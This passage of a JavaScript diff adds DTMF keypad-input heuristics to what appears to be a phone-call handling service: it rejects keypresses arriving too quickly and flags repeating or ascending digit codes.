   process.exit(0);
 });
+    // Inter-key gap heuristic for DTMF spam
+    if (meta.timestamp && exp.profile !== 'menu') {
+      const lastTs = lastDtmfTimestamps.get(callSid) || 0;
+      const gap = lastTs ? meta.timestamp - lastTs : null;
+      if (gap !== null && gap < MIN_DTMF_GAP_MS && cleanDigits.length === 1) {
+        result.accepted = false;
+        result.reason = 'too_fast';
+        result.heuristic = 'inter_key_gap';
+        exp.buffer = '';
+        this.expectations.set(callSid, exp);
+        lastDtmfTimestamps.set(callSid, meta.timestamp);
+        return result;
+      }
+      lastDtmfTimestamps.set(callSid, meta.timestamp);
+    }
+
+    // Pattern heuristics (repeating/ascending) for long codes
+    const isRepeating = (val) => val.length >= 6 && /^([0-9])\1+$/.test(val);
+    const isAscending = (val) => val.length >= 6 && '0123456789'.includes(val);
